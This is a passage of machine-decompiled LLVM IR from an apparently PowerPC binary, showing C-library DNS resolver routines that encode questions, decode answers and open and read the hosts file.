  store i32 %v1_10027c88, i32* %v3_10027c8c, align 4
  %v0_10027c90 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c90 = add i32 %v0_10027c90, 2
  %v2_10027c90 = inttoptr i32 %v1_10027c90 to i8*
  %v3_10027c90 = load i8, i8* %v2_10027c90, align 1
  %tmp1 = urem i8 %v3_10027c90, 2
  %v1_10027c94 = zext i8 %tmp1 to i32
  %v2_10027c98 = add i32 %arg2, 20
  %v3_10027c98 = inttoptr i32 %v2_10027c98 to i32*
  store i32 %v1_10027c94, i32* %v3_10027c98, align 4
  %v0_10027c9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10027c9c = add i32 %v0_10027c9c, 3
  %v2_10027c9c = inttoptr i32 %v1_10027c9c to i8*
  %v3_10027c9c = load i8, i8* %v2_10027c9c, align 1
  %v4_10027c9c = zext i8 %v3_10027c9c to i32
  %v1_10027ca0 = call i32 @__asm_rlwinm(i32 %v4_10027c9c, i32 25, i32 31, i32 31)
  %v2_10027ca4 = add i32 %arg2, 24
  %v3_10027ca4 = inttoptr i32 %v2_10027ca4 to i32*
  store i32 %v1_10027ca0, i32* %v3_10027ca4, align 4
  %v0_10027ca8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027ca8 = add i32 %v0_10027ca8, 3
  %v2_10027ca8 = inttoptr i32 %v1_10027ca8 to i8*
  %v3_10027ca8 = load i8, i8* %v2_10027ca8, align 1
  %tmp2 = urem i8 %v3_10027ca8, 16
  %v1_10027cac = zext i8 %tmp2 to i32
  %v2_10027cb0 = add i32 %arg2, 28
  %v3_10027cb0 = inttoptr i32 %v2_10027cb0 to i32*
  store i32 %v1_10027cac, i32* %v3_10027cb0, align 4
  %v0_10027cb4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cb4 = add i32 %v0_10027cb4, 4
  %v2_10027cb4 = inttoptr i32 %v1_10027cb4 to i8*
  %v3_10027cb4 = load i8, i8* %v2_10027cb4, align 1
  %v4_10027cb4 = zext i8 %v3_10027cb4 to i32
  %v1_10027cb8 = add i32 %v0_10027cb4, 5
  %v2_10027cb8 = inttoptr i32 %v1_10027cb8 to i8*
  %v3_10027cb8 = load i8, i8* %v2_10027cb8, align 1
  %v4_10027cb8 = zext i8 %v3_10027cb8 to i32
  %v1_10027cbc = mul nuw nsw i32 %v4_10027cb4, 256
  %v2_10027cc0 = or i32 %v4_10027cb8, %v1_10027cbc
  %v2_10027cc4 = add i32 %arg2, 32
  %v3_10027cc4 = inttoptr i32 %v2_10027cc4 to i32*
  store i32 %v2_10027cc0, i32* %v3_10027cc4, align 4
  %v0_10027cc8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cc8 = add i32 %v0_10027cc8, 6
  %v2_10027cc8 = inttoptr i32 %v1_10027cc8 to i8*
  %v3_10027cc8 = load i8, i8* %v2_10027cc8, align 1
  %v4_10027cc8 = zext i8 %v3_10027cc8 to i32
  %v1_10027ccc = add i32 %v0_10027cc8, 7
  %v2_10027ccc = inttoptr i32 %v1_10027ccc to i8*
  %v3_10027ccc = load i8, i8* %v2_10027ccc, align 1
  %v4_10027ccc = zext i8 %v3_10027ccc to i32
  %v1_10027cd0 = mul nuw nsw i32 %v4_10027cc8, 256
  %v2_10027cd4 = or i32 %v4_10027ccc, %v1_10027cd0
  %v2_10027cd8 = add i32 %arg2, 36
  %v3_10027cd8 = inttoptr i32 %v2_10027cd8 to i32*
  store i32 %v2_10027cd4, i32* %v3_10027cd8, align 4
  %v0_10027cdc = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cdc = add i32 %v0_10027cdc, 8
  %v2_10027cdc = inttoptr i32 %v1_10027cdc to i8*
  %v3_10027cdc = load i8, i8* %v2_10027cdc, align 1
  %v4_10027cdc = zext i8 %v3_10027cdc to i32
  %v1_10027ce0 = add i32 %v0_10027cdc, 9
  %v2_10027ce0 = inttoptr i32 %v1_10027ce0 to i8*
  %v3_10027ce0 = load i8, i8* %v2_10027ce0, align 1
  %v4_10027ce0 = zext i8 %v3_10027ce0 to i32
  %v1_10027ce4 = mul nuw nsw i32 %v4_10027cdc, 256
  %v2_10027ce8 = or i32 %v4_10027ce0, %v1_10027ce4
  %v2_10027cec = add i32 %arg2, 40
  %v3_10027cec = inttoptr i32 %v2_10027cec to i32*
  store i32 %v2_10027ce8, i32* %v3_10027cec, align 4
  %v0_10027cf0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027cf0 = add i32 %v0_10027cf0, 10
  %v2_10027cf0 = inttoptr i32 %v1_10027cf0 to i8*
  %v3_10027cf0 = load i8, i8* %v2_10027cf0, align 1
  %v4_10027cf0 = zext i8 %v3_10027cf0 to i32
  %v1_10027cf4 = add i32 %v0_10027cf0, 11
  %v2_10027cf4 = inttoptr i32 %v1_10027cf4 to i8*
  %v3_10027cf4 = load i8, i8* %v2_10027cf4, align 1
  %v4_10027cf4 = zext i8 %v3_10027cf4 to i32
  store i32 %v4_10027cf4, i32* %r9.global-to-local, align 4
  %v1_10027cf8 = mul nuw nsw i32 %v4_10027cf0, 256
  %v2_10027cfc = or i32 %v4_10027cf4, %v1_10027cf8
  %v2_10027d00 = add i32 %arg2, 44
  %v3_10027d00 = inttoptr i32 %v2_10027d00 to i32*
  store i32 %v2_10027cfc, i32* %v3_10027d00, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 24, 25, 16, 17, 26, 34, 13, 7, 27, 35, 8, 14, 15, 28, 3, 4, 29, 30, 31, 32, 33, 5, 0, 18, 9, 10, 1, 12, 2, 11, 6, 19, 20, 21, 22, 23 }
  uselistorder i32 40, { 22, 23, 26, 28, 25, 12, 13, 14, 15, 10, 27, 8, 9, 24, 0, 21, 16, 17, 29, 30, 31, 32, 33, 19, 18, 1, 11, 20, 2, 4, 3, 6, 5, 7 }
  uselistorder i32 7, { 31, 32, 38, 15, 0, 3, 10, 11, 12, 13, 14, 34, 35, 36, 37, 4, 2, 5, 6, 16, 7, 17, 8, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 30, 33, 9 }
  uselistorder i8 2, { 1, 8, 3, 2, 4, 0, 5, 9, 6, 10, 7, 11 }
  uselistorder i32 30, { 28, 19, 20, 25, 15, 16, 17, 18, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 21, 22, 23, 24, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 0 }
  uselistorder i32 28, { 80, 81, 82, 83, 97, 84, 99, 111, 112, 85, 0, 86, 87, 88, 6, 7, 27, 28, 29, 30, 31, 32, 33, 16, 17, 18, 98, 100, 74, 34, 8, 9, 10, 35, 65, 66, 19, 20, 1, 21, 22, 23, 24, 89, 90, 91, 92, 93, 101, 102, 103, 104, 105, 106, 109, 107, 108, 2, 110, 115, 94, 41, 116, 117, 36, 37, 11, 12, 13, 14, 25, 26, 120, 121, 118, 119, 113, 114, 38, 39, 40, 42, 43, 44, 45, 46, 47, 15, 48, 49, 50, 51, 52, 53, 3, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 68, 69, 70, 71, 72, 73, 75, 76, 77, 78, 4, 5, 79, 95, 96 }
  uselistorder i32 29, { 28, 4, 5, 8, 6, 7, 36, 37, 9, 10, 11, 12, 13, 33, 34, 31, 32, 29, 30, 35, 40, 41, 43, 44, 38, 39, 24, 25, 2, 3, 47, 48, 45, 46, 22, 23, 14, 15, 16, 17, 18, 19, 20, 42, 1, 21, 0, 26, 27 }
  uselistorder i32 31, { 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 39, 40, 3, 4, 2, 0, 34, 35, 41, 42, 43, 21, 22, 5, 6, 1, 13, 7, 19, 20, 10, 11, 12, 44, 45, 46, 61, 62, 59, 60, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 36, 38, 16, 17, 14, 15, 18, 9, 8, 23, 37 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10027d24 = load i32, i32* %arg1, align 4
  store i32 %v2_10027d24, i32* %r3.global-to-local, align 4
  store i32 268598572, i32* @lr, align 4
  %v1_10027d28 = inttoptr i32 %v2_10027d24 to i8*
  %v2_10027d28 = call i32 @__encode_dotted(i8* %v1_10027d28)
  store i32 %v2_10027d28, i32* %r3.global-to-local, align 4
  %v1_10027d2c = icmp slt i32 %v2_10027d28, 0
  %v1_10027d30 = load i32, i32* @r29, align 4
  %v2_10027d30 = sub i32 %v1_10027d30, %v2_10027d28
  store i32 %v2_10027d30, i32* @r29, align 4
  br i1 %v1_10027d2c, label %dec_label_pc_10027d70, label %dec_label_pc_10027d3c

dec_label_pc_10027d3c:                            ; preds = %entry
  %v2_10027d34 = icmp sgt i32 %v2_10027d30, 3
  %v0_10027d3c = load i32, i32* @r30, align 4
  %v2_10027d3c = add i32 %v0_10027d3c, %v2_10027d28
  store i32 %v2_10027d3c, i32* %r9.global-to-local, align 4
  br i1 %v2_10027d34, label %dec_label_pc_10027d4c, label %dec_label_pc_10027d44

dec_label_pc_10027d44:                            ; preds = %dec_label_pc_10027d3c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027d70

dec_label_pc_10027d4c:                            ; preds = %dec_label_pc_10027d3c
  %v0_10027d4c = load i32, i32* @r31, align 4
  %v1_10027d4c = add i32 %v0_10027d4c, 6
  %v2_10027d4c = inttoptr i32 %v1_10027d4c to i8*
  %v3_10027d4c = load i8, i8* %v2_10027d4c, align 1
  %v5_10027d50 = inttoptr i32 %v2_10027d3c to i8*
  store i8 %v3_10027d4c, i8* %v5_10027d50, align 1
  %v0_10027d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_10027d54 = add i32 %v0_10027d54, 4
  store i32 %v1_10027d54, i32* %r3.global-to-local, align 4
  %v0_10027d58 = load i32, i32* @r31, align 4
  %v1_10027d58 = add i32 %v0_10027d58, 4
  %v2_10027d58 = inttoptr i32 %v1_10027d58 to i32*
  %v3_10027d58 = load i32, i32* %v2_10027d58, align 4
  %v1_10027d5c = trunc i32 %v3_10027d58 to i8
  %v2_10027d5c = load i32, i32* %r9.global-to-local, align 4
  %v3_10027d5c = add i32 %v2_10027d5c, 1
  %v4_10027d5c = inttoptr i32 %v3_10027d5c to i8*
  store i8 %v1_10027d5c, i8* %v4_10027d5c, align 1
  %v0_10027d60 = load i32, i32* @r31, align 4
  %v1_10027d60 = add i32 %v0_10027d60, 10
  %v2_10027d60 = inttoptr i32 %v1_10027d60 to i8*
  %v3_10027d60 = load i8, i8* %v2_10027d60, align 1
  %v2_10027d64 = load i32, i32* %r9.global-to-local, align 4
  %v3_10027d64 = add i32 %v2_10027d64, 2
  %v4_10027d64 = inttoptr i32 %v3_10027d64 to i8*
  store i8 %v3_10027d60, i8* %v4_10027d64, align 1
  %v0_10027d68 = load i32, i32* @r31, align 4
  %v1_10027d68 = add i32 %v0_10027d68, 8
  %v2_10027d68 = inttoptr i32 %v1_10027d68 to i32*
  %v3_10027d68 = load i32, i32* %v2_10027d68, align 4
  %v1_10027d6c = trunc i32 %v3_10027d68 to i8
  %v2_10027d6c = load i32, i32* %r9.global-to-local, align 4
  %v3_10027d6c = add i32 %v2_10027d6c, 3
  %v4_10027d6c = inttoptr i32 %v3_10027d6c to i8*
  store i8 %v1_10027d6c, i8* %v4_10027d6c, align 1
  %v0_10027d80.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027d70

dec_label_pc_10027d70:                            ; preds = %entry, %dec_label_pc_10027d44, %dec_label_pc_10027d4c
  %v0_10027d80 = phi i32 [ %v2_10027d28, %entry ], [ -1, %dec_label_pc_10027d44 ], [ %v0_10027d80.pre, %dec_label_pc_10027d4c ]
  ret i32 %v0_10027d80

; uselistorder directives
  uselistorder i32 %v2_10027d28, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_10027d70, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268598676, i32* @lr, align 4
  %v0_10027d90 = call i32 @__length_dotted()
  %v1_10027d94 = icmp slt i32 %v0_10027d90, 0
  br i1 %v1_10027d94, label %dec_label_pc_10027da0, label %dec_label_pc_10027d9c

dec_label_pc_10027d9c:                            ; preds = %entry
  %v1_10027d9c = add i32 %v0_10027d90, 4
  br label %dec_label_pc_10027da0

dec_label_pc_10027da0:                            ; preds = %entry, %dec_label_pc_10027d9c
  %v0_10027dac = phi i32 [ %v0_10027d90, %entry ], [ %v1_10027d9c, %dec_label_pc_10027d9c ]
  ret i32 %v0_10027dac

; uselistorder directives
  uselistorder label %dec_label_pc_10027da0, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10027db4 = load i32, i32* @lr, align 4
  store i32 %v0_10027db4, i32* %r0.global-to-local, align 4
  %v2_10027dbc = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10027dbc, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268598752, i32* @lr, align 4
  %v4_10027ddc = call i32 @__decode_dotted(i32 %v2_10027dbc, i32 256, i32 %v2_10027dbc, i32 256)
  store i32 %v4_10027ddc, i32* @r27, align 4
  %v1_10027de0 = icmp slt i32 %v4_10027ddc, 0
  %v0_10027de4 = load i32, i32* @r28, align 4
  %v2_10027de4 = add i32 %v0_10027de4, %v4_10027ddc
  store i32 %v2_10027de4, i32* @r28, align 4
  %v1_10027de8 = load i32, i32* @r29, align 4
  %v2_10027de8 = sub i32 %v1_10027de8, %v2_10027de4
  %v1_10027dec = add i32 %v2_10027de8, -10
  store i32 %v1_10027dec, i32* @r29, align 4
  br i1 %v1_10027de0, label %dec_label_pc_10027ea8, label %dec_label_pc_10027df8

dec_label_pc_10027df8:                            ; preds = %entry
  %v0_10027dfc = load i32, i32* @r26, align 4
  %v2_10027dfc = add i32 %v0_10027dfc, %v2_10027de4
  store i32 %v2_10027dfc, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10027dec, -1
  br i1 %tmp6, label %dec_label_pc_10027e0c, label %dec_label_pc_10027e04

dec_label_pc_10027e04:                            ; preds = %dec_label_pc_10027df8
  store i32 %v1_10027dec, i32* @r27, align 4
  br label %dec_label_pc_10027ea8

dec_label_pc_10027e0c:                            ; preds = %dec_label_pc_10027df8
  store i32 268598800, i32* @lr, align 4
  %v1_10027e0c = call i32 @__GI_strdup(i32 %v2_10027dbc)
  %v0_10027e10 = load i32, i32* @r30, align 4
  %v1_10027e10 = add i32 %v0_10027e10, 2
  store i32 %v1_10027e10, i32* @r8, align 4
  %v1_10027e14 = load i32, i32* @r31, align 4
  %v2_10027e14 = inttoptr i32 %v1_10027e14 to i32*
  store i32 %v1_10027e0c, i32* %v2_10027e14, align 4
  %v0_10027e18 = load i32, i32* @r8, align 4
  %v1_10027e18 = add i32 %v0_10027e18, 2
  store i32 %v1_10027e18, i32* @r10, align 4
  %v0_10027e1c = load i32, i32* @r30, align 4
  %v1_10027e1c = add i32 %v0_10027e1c, 10
  store i32 %v1_10027e1c, i32* %r6.global-to-local, align 4
  %v0_10027e20 = load i32, i32* @r26, align 4
  %v1_10027e20 = load i32, i32* @r28, align 4
  %v2_10027e20 = add i32 %v1_10027e20, %v0_10027e20
  %v3_10027e20 = inttoptr i32 %v2_10027e20 to i8*
  %v4_10027e20 = load i8, i8* %v3_10027e20, align 1
  %v5_10027e20 = zext i8 %v4_10027e20 to i32
  store i32 %v5_10027e20, i32* %r0.global-to-local, align 4
  %v1_10027e24 = add i32 %v0_10027e1c, 1
  %v2_10027e24 = inttoptr i32 %v1_10027e24 to i8*
  %v3_10027e24 = load i8, i8* %v2_10027e24, align 1
  %v4_10027e24 = zext i8 %v3_10027e24 to i32
  store i32 %v4_10027e24, i32* %r9.global-to-local, align 4
  %v1_10027e28 = mul nuw nsw i32 %v5_10027e20, 256
  %v2_10027e2c = or i32 %v4_10027e24, %v1_10027e28
  store i32 %v2_10027e2c, i32* %r0.global-to-local, align 4
  %v1_10027e30 = load i32, i32* @r31, align 4
  %v2_10027e30 = add i32 %v1_10027e30, 4
  %v3_10027e30 = inttoptr i32 %v2_10027e30 to i32*
  store i32 %v2_10027e2c, i32* %v3_10027e30, align 4
  %v0_10027e34 = load i32, i32* @r30, align 4
  %v1_10027e34 = add i32 %v0_10027e34, 2
  %v2_10027e34 = inttoptr i32 %v1_10027e34 to i8*
  %v3_10027e34 = load i8, i8* %v2_10027e34, align 1
  %v4_10027e34 = zext i8 %v3_10027e34 to i32
  store i32 %v4_10027e34, i32* %r0.global-to-local, align 4
  %v0_10027e38 = load i32, i32* @r8, align 4
  %v1_10027e38 = add i32 %v0_10027e38, 1
  %v2_10027e38 = inttoptr i32 %v1_10027e38 to i8*
  %v3_10027e38 = load i8, i8* %v2_10027e38, align 1
  %v4_10027e38 = zext i8 %v3_10027e38 to i32
  store i32 %v4_10027e38, i32* %r9.global-to-local, align 4
  %v1_10027e3c = mul nuw nsw i32 %v4_10027e34, 256
  %v2_10027e40 = or i32 %v4_10027e38, %v1_10027e3c
  store i32 %v2_10027e40, i32* %r0.global-to-local, align 4
  %v1_10027e44 = load i32, i32* @r31, align 4
  %v2_10027e44 = add i32 %v1_10027e44, 8
  %v3_10027e44 = inttoptr i32 %v2_10027e44 to i32*
  store i32 %v2_10027e40, i32* %v3_10027e44, align 4
  %v0_10027e48 = load i32, i32* @r8, align 4
  %v1_10027e48 = add i32 %v0_10027e48, 2
  %v2_10027e48 = inttoptr i32 %v1_10027e48 to i8*
  %v3_10027e48 = load i8, i8* %v2_10027e48, align 1
  %v4_10027e48 = zext i8 %v3_10027e48 to i32
  store i32 %v4_10027e48, i32* %r0.global-to-local, align 4
  %v0_10027e4c = load i32, i32* @r10, align 4
  %v1_10027e4c = add i32 %v0_10027e4c, 1
  %v2_10027e4c = inttoptr i32 %v1_10027e4c to i8*
  %v3_10027e4c = load i8, i8* %v2_10027e4c, align 1
  %v4_10027e4c = zext i8 %v3_10027e4c to i32
  store i32 %v4_10027e4c, i32* %r11.global-to-local, align 4
  %v1_10027e50 = add i32 %v0_10027e4c, 3
  %v2_10027e50 = inttoptr i32 %v1_10027e50 to i8*
  %v3_10027e50 = load i8, i8* %v2_10027e50, align 1
  %v4_10027e50 = zext i8 %v3_10027e50 to i32
  %v1_10027e54 = mul nuw i32 %v4_10027e48, 16777216
  store i32 %v1_10027e54, i32* %r0.global-to-local, align 4
  %v1_10027e58 = add i32 %v0_10027e4c, 2
  %v2_10027e58 = inttoptr i32 %v1_10027e58 to i8*
  %v3_10027e58 = load i8, i8* %v2_10027e58, align 1
  %v4_10027e58 = zext i8 %v3_10027e58 to i32
  %v1_10027e5c = mul nuw nsw i32 %v4_10027e4c, 65536
  %v2_10027e60 = or i32 %v1_10027e5c, %v1_10027e54
  %v0_10027e64 = load i32, i32* @r28, align 4
  %v1_10027e64 = add i32 %v0_10027e64, 10
  store i32 %v1_10027e64, i32* %r11.global-to-local, align 4
  %v2_10027e68 = or i32 %v2_10027e60, %v4_10027e50
  store i32 %v2_10027e68, i32* %r0.global-to-local, align 4
  %v1_10027e6c = mul nuw nsw i32 %v4_10027e58, 256
  %v2_10027e70 = or i32 %v1_10027e6c, %v2_10027e68
  store i32 %v2_10027e70, i32* %r9.global-to-local, align 4
  %v1_10027e74 = load i32, i32* @r31, align 4
  %v2_10027e74 = add i32 %v1_10027e74, 12
  %v3_10027e74 = inttoptr i32 %v2_10027e74 to i32*
  store i32 %v2_10027e70, i32* %v3_10027e74, align 4
  %v0_10027e78 = load i32, i32* @r8, align 4
  %v1_10027e78 = add i32 %v0_10027e78, 6
  %v2_10027e78 = inttoptr i32 %v1_10027e78 to i8*
  %v3_10027e78 = load i8, i8* %v2_10027e78, align 1
  %v4_10027e78 = zext i8 %v3_10027e78 to i32
  store i32 %v4_10027e78, i32* %r9.global-to-local, align 4
  %v0_10027e7c = load i32, i32* @r30, align 4
  %v1_10027e7c = add i32 %v0_10027e7c, 9
  %v2_10027e7c = inttoptr i32 %v1_10027e7c to i8*
  %v3_10027e7c = load i8, i8* %v2_10027e7c, align 1
  %v4_10027e7c = zext i8 %v3_10027e7c to i32
  store i32 %v4_10027e7c, i32* %r0.global-to-local, align 4
  %v1_10027e80 = mul nuw nsw i32 %v4_10027e78, 256
  store i32 %v1_10027e80, i32* %r9.global-to-local, align 4
  %v0_10027e84 = load i32, i32* %r11.global-to-local, align 4
  %v1_10027e84 = load i32, i32* @r31, align 4
  %v2_10027e84 = add i32 %v1_10027e84, 24
  %v3_10027e84 = inttoptr i32 %v2_10027e84 to i32*
  store i32 %v0_10027e84, i32* %v3_10027e84, align 4
  %v0_10027e88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027e88 = load i32, i32* %r0.global-to-local, align 4
  %v2_10027e88 = or i32 %v1_10027e88, %v0_10027e88
  store i32 %v2_10027e88, i32* %r9.global-to-local, align 4
  %v0_10027e8c = load i32, i32* %r6.global-to-local, align 4
  %v1_10027e8c = load i32, i32* @r31, align 4
  %v2_10027e8c = add i32 %v1_10027e8c, 20
  %v3_10027e8c = inttoptr i32 %v2_10027e8c to i32*
  store i32 %v0_10027e8c, i32* %v3_10027e8c, align 4
  %v0_10027e90 = load i32, i32* @r29, align 4
  %v1_10027e90 = load i32, i32* %r9.global-to-local, align 4
  %v2_10027e90 = icmp slt i32 %v0_10027e90, %v1_10027e90
  %v1_10027e94 = add i32 %v1_10027e90, 10
  store i32 %v1_10027e94, i32* %r0.global-to-local, align 4
  %v0_10027e98 = load i32, i32* @r27, align 4
  %v2_10027e98 = add i32 %v0_10027e98, %v1_10027e94
  store i32 %v2_10027e98, i32* @r27, align 4
  %v1_10027e9c = load i32, i32* @r31, align 4
  %v2_10027e9c = add i32 %v1_10027e9c, 16
  %v3_10027e9c = inttoptr i32 %v2_10027e9c to i32*
  store i32 %v1_10027e90, i32* %v3_10027e9c, align 4
  br i1 %v2_10027e90, label %dec_label_pc_10027ea4, label %dec_label_pc_10027e0c.dec_label_pc_10027ea8_crit_edge

dec_label_pc_10027e0c.dec_label_pc_10027ea8_crit_edge: ; preds = %dec_label_pc_10027e0c
  %v0_10027eac.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10027ea8

dec_label_pc_10027ea4:                            ; preds = %dec_label_pc_10027e0c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10027ea8

dec_label_pc_10027ea8:                            ; preds = %dec_label_pc_10027e0c.dec_label_pc_10027ea8_crit_edge, %entry, %dec_label_pc_10027e04, %dec_label_pc_10027ea4
  %v0_10027eac = phi i32 [ %v0_10027eac.pre, %dec_label_pc_10027e0c.dec_label_pc_10027ea8_crit_edge ], [ %v4_10027ddc, %entry ], [ %v1_10027dec, %dec_label_pc_10027e04 ], [ -1, %dec_label_pc_10027ea4 ]
  store i32 %v0_10027db4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10027eac

; uselistorder directives
  uselistorder i32 %v1_10027e90, { 1, 0, 2 }
  uselistorder i32 %v1_10027e54, { 1, 0 }
  uselistorder i32 %v1_10027dec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10027ddc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10027dbc, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 9, { 27, 28, 29, 5, 15, 31, 6, 32, 7, 33, 3, 30, 13, 14, 34, 35, 36, 37, 38, 8, 16, 39, 9, 4, 10, 11, 12, 1, 0, 17, 18, 19, 20, 21, 22, 23, 24, 2, 25, 26 }
  uselistorder i32 3, { 130, 131, 132, 133, 134, 135, 136, 137, 3, 96, 97, 149, 4, 98, 99, 100, 0, 12, 41, 158, 43, 42, 22, 44, 138, 21, 101, 102, 103, 13, 1, 147, 148, 5, 140, 141, 150, 151, 45, 152, 153, 29, 28, 46, 47, 48, 49, 50, 104, 160, 161, 167, 159, 128, 30, 105, 14, 15, 106, 143, 139, 91, 92, 93, 94, 95, 6, 7, 142, 8, 9, 154, 155, 10, 173, 174, 175, 169, 170, 171, 172, 24, 157, 156, 144, 51, 11, 25, 107, 165, 108, 16, 109, 163, 168, 164, 145, 52, 146, 17, 18, 166, 162, 110, 40, 19, 20, 111, 53, 54, 55, 56, 57, 26, 58, 59, 60, 61, 62, 63, 64, 31, 65, 66, 67, 68, 2, 112, 32, 69, 113, 114, 115, 116, 70, 117, 118, 71, 119, 72, 73, 33, 74, 120, 75, 34, 76, 121, 122, 77, 35, 78, 123, 79, 36, 80, 124, 27, 125, 81, 82, 83, 37, 84, 126, 85, 38, 86, 87, 39, 88, 127, 89, 129, 90, 23 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0, 4, 3 }
  uselistorder i32 -10, { 5, 0, 2, 3, 1, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__decode_dotted, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_10027ea8, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10027ec4 = load i32, i32* @lr, align 4
  store i32 268599016, i32* @lr, align 4
  %v3_10027ee4 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1002fc48.1421 to i32), i32 ptrtoint (i32* @global_var_1002fb28.1345 to i32))
  %v3_10027eec = icmp eq i32 %v3_10027ee4, 0
  br i1 %v3_10027eec, label %dec_label_pc_10027ef4, label %dec_label_pc_10027f10

dec_label_pc_10027ef4:                            ; preds = %entry
  %v0_10027ee8 = load i32, i32* @r29, align 4
  store i32 %v0_10027ec4, i32* @lr, align 4
  %v3_10027f0c = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1002fc54.1422 to i32), i32 %v0_10027ee8)
  br label %dec_label_pc_10027f10

dec_label_pc_10027f10:                            ; preds = %entry, %dec_label_pc_10027ef4
  %v0_10027f20 = phi i32 [ %v3_10027ee4, %entry ], [ %v3_10027f0c, %dec_label_pc_10027ef4 ]
  ret i32 %v0_10027f20

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 14, 3, 2, 1, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002fb28.1345 to i32), { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10027f10, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10027f24 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_10027f38 = sub i32 0, %arg6
  %v1_10027f3c = urem i32 %v1_10027f38, 4
  store i32 %v1_10027f3c, i32* %r0.global-to-local, align 4
  %v3_10027f3c = icmp eq i32 %v1_10027f3c, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* @r19, align 4
  store i32 %arg4, i32* @r18, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10027f54 = load i32, i32* @r10, align 4
  store i32 %v0_10027f54, i32* @r17, align 4
  store i32 %arg8, i32* @r16, align 4
  %v0_10027f70.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10027f3c, label %dec_label_pc_10027f70, label %dec_label_pc_10027f60

dec_label_pc_10027f60:                            ; preds = %entry
  %v2_10027f60 = icmp ult i32 %v0_10027f70.pr, %v1_10027f3c
  br i1 %v2_10027f60, label %dec_label_pc_10028224, label %dec_label_pc_10027f68

dec_label_pc_10027f68:                            ; preds = %dec_label_pc_10027f60
  %v2_10027f68 = sub i32 %v0_10027f70.pr, %v1_10027f3c
  store i32 %v2_10027f68, i32* %r9.global-to-local, align 4
  %v2_10027f6c = add i32 %v1_10027f3c, %arg6
  store i32 %v2_10027f6c, i32* @r30, align 4
  br label %dec_label_pc_10027f70

dec_label_pc_10027f70:                            ; preds = %entry, %dec_label_pc_10027f68
  %v0_10027f7c = phi i32 [ %v2_10027f6c, %dec_label_pc_10027f68 ], [ %arg6, %entry ]
  %v0_10027f80 = phi i32 [ %v2_10027f68, %dec_label_pc_10027f68 ], [ %v0_10027f70.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10027f80, 32
